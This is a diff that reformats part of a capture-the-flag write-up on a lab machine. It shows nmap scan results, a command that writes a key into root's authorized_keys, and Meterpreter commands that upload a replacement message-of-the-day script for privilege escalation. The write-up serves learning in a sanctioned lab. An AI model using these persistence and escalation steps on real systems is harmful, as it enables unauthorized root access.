@@ -1,19 +1,19 @@
 As always, we start with nmap - it comes back with ports 80 and 22 open, so naturally we go check out the web page.
 
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-09 12:10 EDT
-Nmap scan report for 10.10.10.181
-Host is up (0.036s latency).
-Not shown: 65533 closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
-|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
-|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-|_http-title: Help us
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+>Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-09 12:10 EDT  
+Nmap scan report for 10.10.10.181  
+Host is up (0.036s latency).  
+Not shown: 65533 closed ports  
+PORT   STATE SERVICE VERSION  
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
+| ssh-hostkey:  
+|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)  
+|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)  
+|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)  
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))  
+|_http-server-header: Apache/2.4.29 (Ubuntu)  
+|_http-title: Help us  
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
 
 ![websiteLanding](https://github.com/DefinitelyNotDex/imageURLgoesHere)
 
@@ -70,8 +70,8 @@ cat /root/.ssh/root-key-rsa.pub > /root/.ssh/authorized_keys**
 
 Sysadmin shell:
 
->**meterpreter>upload 00-header /etc/.update-motd.d/00-header  
-meterpreter> cat 00-header**
+>**meterpreter>upload 00-header /etc/.update-motd.d/00-header**  
+>**meterpreter> cat 00-header**
 
 (that cat is to confirm 00-header is the correct file and hasn't been immediately overwritten)
 
